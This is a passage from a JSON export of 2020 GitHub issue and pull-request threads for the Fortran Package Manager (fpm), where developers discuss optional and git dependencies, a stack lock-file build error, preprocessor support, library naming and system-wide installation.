                    "text": "I don't personally have a project with special dependencies for an executable, but I could envision one. Somebody develops and tool, and there's a library that goes along with it, but the executable has dependencies that user's of the library don't necessarily need. The use case is probably rare enough, and covered by the executable/test specific dependencies I've already implemented that having dev-dependencies only for tests is probably fine. I'll get that implemented."
                },
                {
                    "user": "certik",
                    "date": "2020-05-31 23:35:10+00:00",
                    "text": "Yes, I think that's precisely the approach that Cargo took also. For this rare case, you just specify the dependency for the executable that needs it. Otherwise the dependencies and dev-dependencies cover over 90% of use cases.\n\nThanks for all the work you are doing on this.\n\u2026\nOn Sun, May 31, 2020, at 5:21 PM, Brad Richardson wrote:\n\n\n I don't personally have a project with special dependencies for an\n executable, but I could envision one. Somebody develops and tool, and\n there's a library that goes along with it, but the executable has\n dependencies that user's of the library don't necessarily need. The use\n case is probably rare enough, and covered by the executable/test\n specific dependencies I've already implemented that having\n `dev-dependencies` only for tests is probably fine. I'll get that\n implemented.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#85 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWCG44ZNP5I7MSX2U3LRULQ6BANCNFSM4NOQBL6A>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-01 16:32:06+00:00",
                    "text": "Sorry, I don't have time to review this but please go forward with it and I will play with it at a later time."
                }
            ]
        },
        {
            "number": 84,
            "user": "certik",
            "date": "2020-05-29 18:14:25+00:00",
            "title": "Optional dependencies",
            "text": "It is extremely common to have optional dependencies in Fortran projects (see the examples section at the end of this description).\nThe way Cargo handles it is described in here: https://doc.rust-lang.org/cargo/reference/specifying-dependencies.html\n[dependencies]\nfoo = { version = \"1.0\", optional = true }\nbar = { version = \"1.0\", optional = true }\n\n[features]\nfancy-feature = [\"foo\", \"bar\"]\nit seems it is somehow tied to \"features\" that one can enable somehow, but I don't yet understand the full mechanism. Also there must be some way to propagate this \"feature\" on/off status inside the code using some macros or something.\nIn Fortran, I can see at least two ways to implemented it, are there more?\n\n\nWe can define some pre-processor definitions and use #ifdef to enable certain code if an optional dependency is used. We can support multiple pre-processors (cpp, fypp, ...).\n\n\nOne can do it at the module level: I sometimes have two files, say, openmp.f90 and openmp.dum.f90 both of which implement the openmp module, so the rest of the Fortran code just use openmp no matter what, and only one of the two files is compiled and linked in the buildsystem:\n# OPENMP\nif(WITH_OPENMP)\n    set(SRC ${SRC}\n        openmp.f90\n    )\nelse()\n    set(SRC ${SRC}\n        openmp.dum.f90\n    )\nendif()\n\n\nThe advantage of 2. is that you do not have to use any pre-processor, which I try to avoid in my codes. The advantage of 1. is that it's simpler in some ways, you just put a few ifdefs in your code.\nI think fpm can support either one, or both.\nfpm could for example create some module, say optional_dependencies and export some variable or a function such as openmp_enabled for the \"openmp\" feature, that you can call in your code and make some decisions.\nEither way, we should figure out how to make fpm support optional dependencies and features that the user can configure.\nExamples\nExample 1\nA typical example is a large electronic structure code, that provides its own default exchange correlation functional, but optionally allows to link against the libxc library, in which case one must enable and link against it and some code paths are different (typically some Fortran modules are enabled / disabled) and it allows the code to use functionals from the libxc library.\nExample 2\nThere are many linear and eigensolver libraries, and there is typically some default, but if the user installs a particular 3rd party solver, it can optionally enable it in the Fortran program to use it instead.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-29 19:36:50+00:00",
                    "text": "I would lean towards option 1 as being easier to implement in fpm. It just doesn't fetch and build optional dependencies unless specified, and only defines the environment variables for the ones specified.\nWith option 2, the build process has to be able to make decisions about which source file gets used to satisfy a given module. This requires us to modify/extend our current naming conventions with regards to source file name and module name.\nI definitely see the need for such a feature, and I think we should definitely try and tackle this at some point."
                }
            ]
        },
        {
            "number": 83,
            "user": "certik",
            "date": "2020-05-24 00:56:44+00:00",
            "title": "Add tests",
            "text": "Currently the new fpm does not seem to have any tests. We have to fix it, and start adding lots of tests.\nIn the old fpm, I had two initial tests:\nhttps://github.com/fortran-lang/fpm/tree/master/archive/tests\nAnd we need to add a lot more. The idea would be to test any configuration that is supported, and that way we can ensure that it works and things don't break when new functionality is implemented.\nFurthermore, if we decide to use a different language for the production implementation, the tests will allow us to ensure that the new implementation works as expected.",
            "comments": []
        },
        {
            "number": 82,
            "user": "everythingfunctional",
            "date": "2020-05-23 17:35:14+00:00",
            "title": "Enable dependencies",
            "text": "This makes working with git dependencies possible!\nSee an example project I create here.\nIt's still very raw, but should work for a lot of situations.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-05-23 19:40:39+00:00",
                    "text": "Great, I'm excited to play with it.\n\nIt's still very raw, but should work for a lot of situations.\n\nAt this time, do you know what situations don't work?"
                },
                {
                    "user": "certik",
                    "date": "2020-05-24 01:00:15+00:00",
                    "text": "Great work, thanks for adding this Brad!\nWe really need to start adding tests for every PR, see #83.\nFor this particular PR, what is the best way to test this? It might be quite hard to setup a test server and download using it, all automatically when running tests. The way I was thinking we can test this is to add support for specifying a dependency that lives on a local filesystem. That way we can simply test it locally, without setting up some test servers."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-24 03:19:07+00:00",
                    "text": "@milancurcic , I think it may still have an issue trying to build if there is a circular dependency. You'll probably hit an infinite loop. But I haven't tested that.\n@certik , Agreed. I'm thinking of going ahead and adding path dependencies, and then yes, you can just test it locally. Really the only way to test whether stuff that needs to go over the network works is to let it go over the network. Otherwise you have to figure out how to supply a \"dummy network\" when working under tests.\nI think at this point, the best tests are going to be beta testers. I'm going to try and migrate a few of my projects to use it and see how it goes. Long term we could take the Rust/Cargo approach and just try to build all the libraries in the registry with every new version. Not sure how feasible that is, but it would at least guarantee we never break any existing packages."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-24 16:10:30+00:00",
                    "text": "I'm getting a stack error building this:\n$ git clone https://github.com/everythingfunctional/fpm -b EnableDependencies\nCloning into 'fpm'...\nremote: Enumerating objects: 172, done.\nremote: Counting objects: 100% (172/172), done.\nremote: Compressing objects: 100% (108/108), done.\nremote: Total 718 (delta 69), reused 132 (delta 45), pack-reused 546\nReceiving objects: 100% (718/718), 123.66 KiB | 981.00 KiB/s, done.\nResolving deltas: 100% (303/303), done.\n$ cd fpm/\n$ stack build\nAeson exception:\nError in $.packages[0].completed: failed to parse field 'packages': failed to parse field 'completed': Could not parse a UnresolvedPackageLocationImmutable from: Object (fromList [(\"name\",String \"tomland\"),(\"version\",String \"1.3.0.0\"),(\"git\",String \"https://github.com/kowainik/tomland.git\"),(\"pantry-tree\",Object (fromList [(\"size\",Number 5000.0),(\"sha256\",String \"68d6f9a3e4c20cc4645374b30000017a75c4ab1c131590538edad2ea0e4a53bd\")])),(\"commit\",String \"536a5e6ffb148d0dd4e4c4b120913a6744097676\")])\n\nMaster builds fine. I poked around a little bit and found that if I remove stack.yaml.lock, stack build works as expected.\nShould stack.yaml.lock then be removed from the repo?\nOtherwise, it works great. I made a simple program that fetches datetime and prints current time on the screen:\n$ cat fpm.toml \nname = \"current-time\"\n\n[dependencies]\ndatetime = {git = \"https://github.com/wavebitscientific/datetime-fortran\"}\n$ cat app/main.f90 \nuse datetime_module, only: datetime\ntype(datetime) :: a\na =  a % now()\nprint *, a % strftime('%d %B %Y %H:%M:%S')\nend"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-25 02:09:30+00:00",
                    "text": "I'm getting a stack error building this:\n$ git clone https://github.com/everythingfunctional/fpm -b EnableDependencies\nCloning into 'fpm'...\nremote: Enumerating objects: 172, done.\nremote: Counting objects: 100% (172/172), done.\nremote: Compressing objects: 100% (108/108), done.\nremote: Total 718 (delta 69), reused 132 (delta 45), pack-reused 546\nReceiving objects: 100% (718/718), 123.66 KiB | 981.00 KiB/s, done.\nResolving deltas: 100% (303/303), done.\n$ cd fpm/\n$ stack build\nAeson exception:\nError in $.packages[0].completed: failed to parse field 'packages': failed to parse field 'completed': Could not parse a UnresolvedPackageLocationImmutable from: Object (fromList [(\"name\",String \"tomland\"),(\"version\",String \"1.3.0.0\"),(\"git\",String \"https://github.com/kowainik/tomland.git\"),(\"pantry-tree\",Object (fromList [(\"size\",Number 5000.0),(\"sha256\",String \"68d6f9a3e4c20cc4645374b30000017a75c4ab1c131590538edad2ea0e4a53bd\")])),(\"commit\",String \"536a5e6ffb148d0dd4e4c4b120913a6744097676\")])\n\nMaster builds fine. I poked around a little bit and found that if I remove stack.yaml.lock, stack build works as expected.\nShould stack.yaml.lock then be removed from the repo?\nOtherwise, it works great. I made a simple program that fetches datetime and prints current time on the screen:\n$ cat fpm.toml \nname = \"current-time\"\n\n[dependencies]\ndatetime = {git = \"https://github.com/wavebitscientific/datetime-fortran\"}\n$ cat app/main.f90 \nuse datetime_module, only: datetime\ntype(datetime) :: a\na =  a % now()\nprint *, a % strftime('%d %B %Y %H:%M:%S')\nend\n\n\nThat's odd. stack.yaml.lock is supposed to ensure that exactly the same dependency versions get used for everybody. It looks like something went funky with the specific version of tomland that I specified. What is the difference in that file after you removed it and rebuilt?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-25 18:02:06+00:00",
                    "text": "$ diff stack.yaml.lock stack.yaml.lock.orig \n8,10d7\n<     cabal-file:\n<       size: 6802\n<       sha256: 85568a0280115b6e9a9f263cf4cfc72ad5a6eaeb2412875816adb82ea6a405bc\n\nstack.yaml.lock.orig is the one checked out from the repo. stack.yaml.lock is the one generated by stack build.\nI don't understand how is this related to the specific tomland version \ud83d\ude15\nFWIW, I reproduced this on Fedora 28 and Ubuntu 18.10."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-25 18:44:08+00:00",
                    "text": "It looks like the difference in the files is in the tomland section, and the error message you got mentions tomland. So that's where the problem is, but I'm still not sure why. I'm on Arch running version 2.3.1 of stack. Maybe the format/info in the stack.yaml.lock versions has changed slightly?\nI can remove it for now, since things work without it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-25 18:55:22+00:00",
                    "text": "Sounds good, this can be merged IMO."
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 19:02:22+00:00",
                    "text": "Here is the error that I am getting with d89214b on Ubuntu 18.04:\n$ stack build\nAeson exception:\nError in $.packages[0].completed: failed to parse field 'packages': failed to parse field 'completed': Could not parse a UnresolvedPackageLocationImmutable from: Object (fromList [(\"name\",String \"tomland\"),(\"version\",String \"1.3.0.0\"),(\"git\",String \"https://github.com/kowainik/tomland.git\"),(\"pantry-tree\",Object (fromList [(\"size\",Number 5000.0),(\"sha256\",String \"68d6f9a3e4c20cc4645374b30000017a75c4ab1c131590538edad2ea0e4a53bd\")])),(\"commit\",String \"536a5e6ffb148d0dd4e4c4b120913a6744097676\")])\n\nWith 1cb711d things build fine.\nThe lock file, at least for Rust, is supposed to be checked into git for applications but not libraries. fpm would be an application."
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 19:03:20+00:00",
                    "text": "As a side note, since fpm is following the same design as Stack and Cargo: I want fpm's error messages to be much nicer and more user friendly than the above exception that Stack gives. :)"
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-25 19:28:13+00:00",
                    "text": "Aren't you are supposed to recommit the lock file whenever you add/update dependencies - @everythingfunctional is the tomland dependency new in this PR?"
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 19:31:17+00:00",
                    "text": "Yes, you are supposed to regenerate it when dependencies change. The tomlang dep seems to be new here?\nhttps://github.com/fortran-lang/fpm/pull/82/files#diff-fafd0cdcd559a7b124cc61c29413fb54R42"
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 19:34:39+00:00",
                    "text": "When I commit the new lock file that got generated for me, and diff the old one, here is what I get:\n$ git diff d89214b\ndiff --git a/stack.yaml.lock b/stack.yaml.lock\nindex 31e0c19..15bfc22 100644\n--- a/stack.yaml.lock\n+++ b/stack.yaml.lock\n@@ -5,6 +5,9 @@\n \n packages:\n - completed:\n+    cabal-file:\n+      size: 6802\n+      sha256: 85568a0280115b6e9a9f263cf4cfc72ad5a6eaeb2412875816adb82ea6a405bc\n     name: tomland\n     version: 1.3.0.0\n     git: https://github.com/kowainik/tomland.git\nFurthermore, when I remove those 3 lines by hand, I get the exception above.\nFrom this I conclude that the lock file should be committed, and it should contain the above 3 lines."
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 19:42:19+00:00",
                    "text": "I pushed in the lock file again. Things work on my machine and tests pass at the CI.\n@everythingfunctional can you verify that things work on your machine also with the latest commit 3613167?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-25 19:51:50+00:00",
                    "text": "Any ideas why the CI tests were not affected by this lock file problem?"
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 20:07:51+00:00",
                    "text": "Any ideas why the CI tests were not affected by this lock file problem?\n\nExactly, this worries me too that our CI passed even though the lock file was broken. Possibly the CI uses a different Haskell version?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-25 20:56:23+00:00",
                    "text": "I suspect my machine and the CI are using a newer version of stack, which does not need those 3 lines in the stack.yaml.lock file. @certik , your latest push does work on my machine.\nYes, the .lock file should generally be checked in to version control. It's generally ignored for dependencies, (i.e. if a library has this file, when you include it as a dependency, that file doesn't even get looked at). It's purpose is to avoid having to consider different versions of dependencies when trying to diagnose \"works on my machine\" type issues. Stack is able to make sure you're using the exact same dependencies of everything your project uses, including the version of GHC (the Haskell compiler), except for the version of Stack itself. It seems to me that's the only possible explanation here.\n@LKedward , the dependency on tomland isn't new here, but I had to implement some new functionality in that library, and it hasn't made it to an official release yet, so I had to specify it as a git dependency. That part is new here."
                },
                {
                    "user": "certik",
                    "date": "2020-05-28 20:43:47+00:00",
                    "text": "Thanks for merging."
                }
            ]
        },
        {
            "number": 81,
            "user": "ShamanTcler",
            "date": "2020-05-19 12:59:23+00:00",
            "title": "Understanding intent",
            "text": "This is more of a discussion than an issue.\nAs a developer who routinely develops in FORTRAN and  C, I have come across Conan, http://conan.io a C/C++ package manager.\nNow in my mind C and FORTRAN are very similar in character ... both have attributes such as:\n\ncompilers\n\ncompiler vendors\ncompiler versions\ncompiler flags\n\n\nbitness (32 vs 64)\ndebug/release builds\n\nEtc.\nConan manages these very well via a hash assigned to the package.\nNow I tried about two years ago to implement a similar scheme, to what Conan was doing but finally said ... they just do it better.\nToday I use VS Code, CMake/Ninja and Conan as my \"best practice\". ( BTW, the new Ninja version 10.  native support for FORTRAN modules ) This set up supports Intel FORTRAN/GFORTRAN and hopefully FLANG soon\nSo I am curious what do you think you bring new to the table.\nPlease don't think I am just throwing stones ... I have hundreds of thousands of lines of FORTRAN code, and Conan is bit of a \"force fit\", but not bad,  ... so I truly am looking to improve my best practice.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-05-19 13:42:12+00:00",
                    "text": "Hi @ShamanTcler and welcome! Thank you for starting this discussion.\nHere's an excerpt from an email I sent to colleagues a few days ago. It's my answer to your question.\nfpm solves the (1) user and (2) developer experience problem. I don't think it solves any technical problem. How it's implemented under the hood is details, and there are many different roads we can take. But in the design of fpm we focus on UI and UX.\n\nUser experience: Once fpm is installed, all that the user has to do is fpm build, fpm run, fpm test, or fpm install. This is by far the simplest UI for Fortran out there, and is aligned to what Cargo does (we designed it after Cargo exactly with UX in mind). So the only friction comes down to installing fpm. If we make this seamless--single binary executable to download--then we'll have reduced the friction to near minimum.\n\nThe key solution for here is that the user doesn't have to a) download the source code by hand; b) edit any build files; and c) download and build any dependencies by hand.\n\nDeveloper experience: See this doc that describes the layout of an fpm package. As you can see, we take the sane default approach like Cargo where we assume a package layout and file and module naming conventions. So the developer has to remember/learn only where to put the files and how to name them. As far as I'm aware, this is the simplest developer UI for Fortran out there. Plus, the developer also gets the perk from the user experience above, which is that dependencies are automatically downloaded, built, and linked for you.\n\nAs you know, there are tools that collectively do all of the stuff that I described. However, there's no single tool that does all of what we want, and no more. Most tools were designed and intended as \"the one build system/package manager to rule them all\". They all fail because this is an extremely difficult problem. They also tend to be language agnostic (or at least support several different languages), so they necessarily have to be more general and handle more edge cases, which means more complex, and more complicated for the user.\nAnother great developer recently said \"we don't need another language-specific tool\". I think that's exactly what we need. Language-agnostic is what makes a tool become either too general and complex, or the design gets out of hand to reach all its objectives. Cargo is perfect for Rust. We need Cargo for Fortran.\nThere's also a cultural and aesthetic aspect that people rarely bring up. It's very difficult to convince a community of developers to adopt exclusively Conda, CMake, Meson, Ninja, or whatever. Conda is maybe becoming a household name in scientific Python community, but CMake is far from being a household name for Fortran. If there's a household name for Fortran, that would maybe be autotools + Make, and that's just Linux. Yes, I'm mixing up build systems and package managers here, but I'm trying to make a point, which is that we need a household name. We need a tool that, when a newcomer to Fortran visits fortran-lang.org, we can tell them here is the one tool you should use. This will only work if we have mass buy in from the community, and I think we can do this more easily if we build a Fortran-specific build system + package manager in a single tool, than trying to adopt multiple external tools.\nIt's easy for you and me and most people here to say \"why do you need this when there are already tools X, Y, and Z\". I consider myself technically literate, and I'd walk away from a project if it asked me to install Meson or Ninja. I've walked away before from Python packages that only had the Conda install instruction, and were not installable by pip. That's just me. Now imagine how it is for somebody new to Fortran, not to mention somebody new to programming.\nWe are targeting Fortran users across all skill levels, and especially the entry level programmers. I think it's crucial for Fortran that a new programmer who learns Fortran as their first language, loves the experience and is not scared off.\nThe Fortran build system + package manager must be at least as easy (and should be easier) to install and use, than it is to install and use the compiler directly.\n\nTake a look at Fortran Discourse. I think it's the perfect format for discussions like this."
                },
                {
                    "user": "ShamanTcler",
                    "date": "2020-05-19 14:42:45+00:00",
                    "text": "Thanks for the link to \"FORTRAN Discourse\" ... already joined. ( user CandL there)\nI see mention of FORTRANCon  ... good 'ole Steve Lionel is the key note, should be a good show.\nYour comment \"I consider myself technically literate, and I'd walk away from a project if it asked me to install Meson or Ninja.\" leaves me a bit perplexed ... at least regarding Ninja. I am sure this could lead to an interesting evening over a few adult beverages of your choice.\nBut I agree the discourse area is a better spot for this discussion. Thanks for your time and consideration.\nRegards\nCarl"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-19 15:22:40+00:00",
                    "text": "Your comment \"I consider myself technically literate, and I'd walk away from a project if it asked me to install Meson or Ninja.\" leaves me a bit perplexed ... at least regarding Ninja.\n\nYes, a bit of a hyperbole. If I need the project to get work done, sure. If I'm just playing, I'd pass. From Ninja's landing page, I'm not clear how it can help me. From the manual, it sounds like a faster Make. So, a tool for power users.\n\nI am sure this could lead to an interesting evening over a few adult beverages of your choice.\n\nI hope we get a chance to do it soon! :)"
                }
            ]
        },
        {
            "number": 80,
            "user": "milancurcic",
            "date": "2020-05-17 20:20:24+00:00",
            "title": "Install dependencies from remote git URLs",
            "text": "As discussed in #33, let's allow installing fpm-enabled packages form their git repositories.\nIf the following is placed in fpm.toml:\n[dependencies]\ndependency_name = { git = git_url, tag = git_tag }\nThen the package depends on dependency_name, which fpm will fetch from git_url and a specific git tag git_tag.\nHere's a concrete example that will work, when this issue is implemented.\n[dependencies]\ndatetime = { git = \"https://github.com/wavebitscientific/datetime-fortran\", tag = \"v1.7.0\" }\nQuestion: If tag is omitted, should fpm fetch from the latest commit on master? I think so. Cargo does it like that as well. Then you could also do:\n[dependencies]\ndatetime = { git = \"https://github.com/wavebitscientific/datetime-fortran\" }",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-17 20:23:03+00:00",
                    "text": "This is exactly my plan."
                },
                {
                    "user": "certik",
                    "date": "2020-05-17 21:05:04+00:00",
                    "text": "Yes, if tag is omitted, it should check out the latest master.\nOtherwise I agree."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-01 17:46:14+00:00",
                    "text": "This was finished in #85"
                }
            ]
        },
        {
            "number": 79,
            "user": "certik",
            "date": "2020-05-14 19:48:36+00:00",
            "title": "Easily create a Spack package",
            "text": "This issue is similar to #70 but for Spack instead of Conda. Essentially for people that use Spack (myself included sometimes), it would be nice to just be able to spack install any fpm package.\nTo do that, fpm should be able to take any package and produce a working Spack package out of it, that can then be submitted to Spack.\nThe generated Spack package would probably call fpm underneath to do the build.",
            "comments": []
        },
        {
            "number": 78,
            "user": "LKedward",
            "date": "2020-05-12 12:35:32+00:00",
            "title": "Preprocessor support",
            "text": "This issue is to ask whether fpm will have any built-in support for preprocessing and how this might look.\nI bring this up since I noticed that stdlib is listed in #17 under 'Pure Fortran', however it requires the fypp preprocessor to build from repo source.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-12 14:18:26+00:00",
                    "text": "We've had discussions about it. I believe we decided we want to settle on a preprocessor, and just always use it. I'd have to go find that discussion, but I believe we settled on fypp."
                },
                {
                    "user": "certik",
                    "date": "2020-05-12 14:49:08+00:00",
                    "text": "Yes, we definitely want fpm to apply a preprocessor. We also talked about file extensions, and it seems most people would prefer to just stick with .f90, and fpm would apply the preprocessor appropriately (via a compiler option or otherwise).\nWe probably should support both cpp and fypp. For fypp we should further provide a fast C++ implementation, so that we don't have to depend on Python."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-12 15:23:04+00:00",
                    "text": "\ud83d\udc4d on both cpp and fypp. cpp is de facto standard and many Fortran projects rely on it. fypp we have established earlier that it is more powerful than cpp and thus useful for generation of specific procedures like those in stdlib.\n\nFor fypp we should further provide a fast C++ implementation, so that we don't have to depend on Python.\n\nI agree, although this is a non-issue until fpm itself is Fortran or C++. Python ships out of the box on most systems."
                },
                {
                    "user": "certik",
                    "date": "2020-05-12 15:33:39+00:00",
                    "text": "I agree, although this is a non-issue until fpm itself is Fortran or C++.\n\nActually it's an issue for distributing fpm, as we cannot easily integrate fypp into the fpm single binary, so we now have to ship it along side fpm somehow, etc.\nHowever, since we will eventually use Conda for the non Fortran dependencies, then fypp can just be installed using Conda / Mamba, and then indeed it should become a non-issue."
                }
            ]
        },
        {
            "number": 77,
            "user": "milancurcic",
            "date": "2020-05-10 18:20:20+00:00",
            "title": "Should we refer to this software as FPM or fpm?",
            "text": "They mean the same, but they look and \"feel\" different. We should have a consistent way to refer to this so it's not confusing to the readers whether they're different things. Especially as we begin to write about these things more publicly?\nI've been using both. I don't know which one I prefer. Perhaps 60/40 in favor of fpm.\nSo, which one should it be?",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-10 18:24:29+00:00",
                    "text": "I've been using both also. Let's use lowercase.\n\nI think fpm, with `fpm` in markdown. Just like git or markdown.\n\nIf it is at the beginning of a sentence, let's use Fpm.\n\u2026\nOn Sun, May 10, 2020, at 12:20 PM, Milan Curcic wrote:\n\n\n They mean the same, but they look and \"feel\" different. We should have\n a consistent way to refer to this so it's not confusing to the readers\n whether they're different things. Especially as we begin to write about\n these things more publicly?\n\n I've been using both. I don't know which one I prefer. Perhaps 60/40 in\n favor of fpm.\n\n So, which one should it be?\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#77>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWDU4C2JEGTK7CN6IJTRQ3V7BANCNFSM4M5LDRPA>."
                },
                {
                    "user": "certik",
                    "date": "2020-05-10 18:31:19+00:00",
                    "text": "I guess git uses both Git and git: https://git-scm.com/\n\nI think svn also uses both SVN and svn.\n\nI am fine either way.\n\nWe can have a rule to use FPM when referencing the project, but fpm when the executable, and encourage to use fpm where it make sense. But should we write Fortran Package Manager (FPM) or Fortran Package Manager (fpm) at the top of the website?\n\nOndrej\n\u2026\nOn Sun, May 10, 2020, at 12:24 PM, Ond\u0159ej \u010cert\u00edk wrote:\n I've been using both also. Let's use lowercase.\n\n I think fpm, with `fpm` in markdown. Just like git or markdown.\n\n If it is at the beginning of a sentence, let's use Fpm.\n\n On Sun, May 10, 2020, at 12:20 PM, Milan Curcic wrote:\n >\n >\n > They mean the same, but they look and \"feel\" different. We should have\n > a consistent way to refer to this so it's not confusing to the readers\n > whether they're different things. Especially as we begin to write about\n > these things more publicly?\n >\n > I've been using both. I don't know which one I prefer. Perhaps 60/40 in\n > favor of fpm.\n >\n > So, which one should it be?\n >\n > \u2014\n > You are receiving this because you are subscribed to this thread.\n > Reply to this email directly, view it on GitHub\n > <#77>, or unsubscribe\n > <https://github.com/notifications/unsubscribe-auth/AAAFAWDU4C2JEGTK7CN6IJTRQ3V7BANCNFSM4M5LDRPA>.\n >"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-10 18:59:39+00:00",
                    "text": "Node Package Manager uses npm universally. Even the company is called \"npm, Inc.\".\nI vote for fpm all the way, and fpm when referring specifically to the command line executable."
                },
                {
                    "user": "certik",
                    "date": "2020-05-10 19:14:26+00:00",
                    "text": "I also vote fpm all the way.\n\u2026\nOn Sun, May 10, 2020, at 12:59 PM, Milan Curcic wrote:\n\n\n Node Package Manager <https://www.npmjs.com/> uses npm universally.\n Even the company is called \"npm, Inc.\".\n\n I vote for fpm all the way, and `fpm` when referring specifically to\n the command line executable.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#77 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWH4JET6LJBKTX7JHJLRQ32SNANCNFSM4M5LDRPA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-11 02:19:29+00:00",
                    "text": "I can come up with logical arguments for either.\nOn the one hand, it's a proper noun, Fortran is capitalized, and it's an acronym, so FPM would make sense.\nOn the other hand, Fortran is a case insensitive language, and our community style guide seems to be leaning towards all lowercase, so fpm would be consistent with that.\nGiven that this really is a purely aesthetic choice, and there seems to be a trend in other places towards all lowercase, I have nothing against using fpm everywhere. I'll start doing that."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-17 20:09:08+00:00",
                    "text": "The consensus so far is to use \"fpm\" everywhere. Closing."
                }
            ]
        },
        {
            "number": 76,
            "user": "everythingfunctional",
            "date": "2020-05-10 04:15:33+00:00",
            "title": "Prefix library archive file names with lib",
            "text": "Fix #75",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-10 05:01:32+00:00",
                    "text": "+1, looks good\n\u2026\nOn Sat, May 9, 2020, at 10:15 PM, Brad Richardson wrote:\n\n\n @everythingfunctional <https://github.com/everythingfunctional>\n requested your review on: #76\n <#76> Prefix library archive\n file names with lib.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#76 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWC2J6GTOZI5TTUQDW3RQYS7BANCNFSM4M5CPJ6A>."
                }
            ]
        },
        {
            "number": 75,
            "user": "milancurcic",
            "date": "2020-05-09 20:22:10+00:00",
            "title": "Add lib prefix to the static library file name",
            "text": "Currently, FPM emits a static library file that has the same name as the project. For example, first line of fpm.toml could be:\nname = \"datetime\"\nThen, the static library created is datetime.a. However, the canonical way to name libraries (static and dynamic) is to use a lib prefix: libdatetime.a. Then one can link to this library with -ldatetime.\nCurrent workaround can be to add the lib prefix to the package name in fpm.toml:\nname = \"libdatetime\"\nHowever, this isn't pretty, and would down the road be more awkward once we're installing packages from remote URLs.\nLet's add the lib prefix to library files.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-09 21:25:13+00:00",
                    "text": "I agree.\n\u2026\nOn Sat, May 9, 2020, at 2:22 PM, Milan Curcic wrote:\n\n\n Currently, FPM emits a static library file that has the same name as\n the project. For example, first line of `fpm.toml` could be:\n\n name = \"datetime\"\n Then, the static library created is `datetime.a`. However, the\n canonical way to name libraries (static and dynamic) is to use a `lib`\n prefix: `libdatetime.a`. Then one can link to this library with\n `-ldatetime`.\n\n Current workaround can be to add the `lib` prefix to the package name\n in `fpm.toml`:\n\n name = \"libdatetime\"\n However, this isn't pretty, and would down the road be more awkward\n once we're installing packages from remote URLs.\n\n Let's add the `lib` prefix to library files.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#75>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWETEZUJY7Q5QWRYIYTRQW3P3ANCNFSM4M46DEDQ>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-10 03:41:20+00:00",
                    "text": "I see. This is a simple enough change to make. I will note however that FPM is just including the archive directly in the link command, rather specify both -Ilib/folder and -lname arguments. So this will only impact users doing things outside of FPM. Granted that many people will want to do things outside of FPM, I think it makes sense to go ahead and do it."
                }
            ]
        },
        {
            "number": 74,
            "user": "everythingfunctional",
            "date": "2020-05-04 02:55:33+00:00",
            "title": "Add compiler to build path",
            "text": "This is the first part of supporting #66\nNote: This should be merged after #72",
            "comments": []
        },
        {
            "number": 73,
            "user": "everythingfunctional",
            "date": "2020-05-04 02:35:09+00:00",
            "title": "Output a message if no executables or tests are found",
            "text": "Fix #64",
            "comments": []
        },
        {
            "number": 72,
            "user": "everythingfunctional",
            "date": "2020-05-04 02:22:15+00:00",
            "title": "Remove compiler option from `fpm.toml`",
            "text": "Fix #63",
            "comments": []
        },
        {
            "number": 71,
            "user": "epagone",
            "date": "2020-05-03 17:20:05+00:00",
            "title": "Install app or library system-wide",
            "text": "I know it might be a bit early but I'd like to log this issue that is particularly important for me.\nTo use routinely fpm, I would need a functionality that works a bit like sudo make install to install the executable or library system-wide.\nPS: thanks for your great work!",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-05-03 21:16:09+00:00",
                    "text": "@epagone thanks! Yes, we have to do it.\n@everythingfunctional how can one do that using stack install? I read through stack install --help but didn't see an option to install into /usr/local/bin/."
                },
                {
                    "user": "epagone",
                    "date": "2020-05-03 22:58:47+00:00",
